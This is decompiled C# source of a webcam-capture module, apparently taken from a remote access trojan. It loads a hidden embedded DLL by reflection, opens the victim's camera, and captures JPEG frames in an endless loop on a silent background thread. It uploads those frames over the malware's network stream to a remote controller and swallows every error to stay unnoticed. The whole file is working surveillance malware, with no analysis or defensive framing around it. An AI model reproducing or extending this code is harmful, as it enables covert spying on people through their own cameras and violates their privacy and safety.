using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000008 RID: 8
[StandardModule]
internal sealed class Webcam
{
	// Token: 0x06000079 RID: 121 RVA: 0x00009430 File Offset: 0x00007630
	public static void startcam(int camera, int resolution, object interval)
	{
		try
		{
			Webcam.t.GetMethod("HandleGetWebcam").Invoke(Webcam.t, new object[]
			{
				camera,
				resolution
			});
			Thread.Sleep(700);
			Server.webcamenabled = true;
			if (Webcam.newt.ThreadState == ThreadState.Running)
			{
				Webcam.newt.Abort();
			}
			Webcam.newt = new Thread(new ParameterizedThreadStart(Webcam.returnImg));
			Webcam.newt.IsBackground = true;
			Webcam.newt.SetApartmentState(ApartmentState.STA);
			Webcam.newt.Start(RuntimeHelpers.GetObjectValue(interval));
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x0600007A RID: 122 RVA: 0x000094F4 File Offset: 0x000076F4
	public static void returnImg(object interval)
	{
		for (;;)
		{
			try
			{
				Webcam.snapshot = (Bitmap)Webcam.t.GetMethod("ReturnCamImage").Invoke(Webcam.t, null);
				Webcam.snapshot.SetResolution(212f, 212f);
				ImageCodecInfo encoder = RemoteDesktop.get_Codec("image/jpeg");
				EncoderParameters encoderParameters = new EncoderParameters(1);
				encoderParameters.Param[0] = new EncoderParameter(Encoder.Quality, 35L);
				MemoryStream stream = new MemoryStream();
				Webcam.snapshot.Save(stream, encoder, encoderParameters);
				Webcam.tojpg = (Bitmap)Image.FromStream(stream);
				Functions.uploadserialized(Server.nstream, Webcam.tojpg);
				object instance = null;
				Type typeFromHandle = typeof(Thread);
				string memberName = "Sleep";
				object[] array = new object[]
				{
					RuntimeHelpers.GetObjectValue(interval)
				};
				object[] arguments = array;
				string[] argumentNames = null;
				Type[] typeArguments = null;
				bool[] array2 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(instance, typeFromHandle, memberName, arguments, argumentNames, typeArguments, array2, true);
				if (array2[0])
				{
					interval = RuntimeHelpers.GetObjectValue(array[0]);
				}
				Webcam.snapshot.Dispose();
				Webcam.tojpg.Dispose();
				GC.Collect();
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x0600007B RID: 123 RVA: 0x00009620 File Offset: 0x00007820
	public static void endcam()
	{
		try
		{
			Server.webcamenabled = false;
			Webcam.newt.Abort();
			Webcam.t.GetMethod("HandleDoWebcamStop").Invoke(Webcam.t, null);
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x04000026 RID: 38
	private static Thread newt = new Thread(new ParameterizedThreadStart(Webcam.returnImg));

	// Token: 0x04000027 RID: 39
	private static Bitmap snapshot;

	// Token: 0x04000028 RID: 40
	private static Bitmap tojpg;

	// Token: 0x04000029 RID: 41
	private static Assembly camdll = Assembly.Load(Server.DllRes);

	// Token: 0x0400002A RID: 42
	private static Type t = Webcam.camdll.GetType("Firebird.CommandHandler");
}
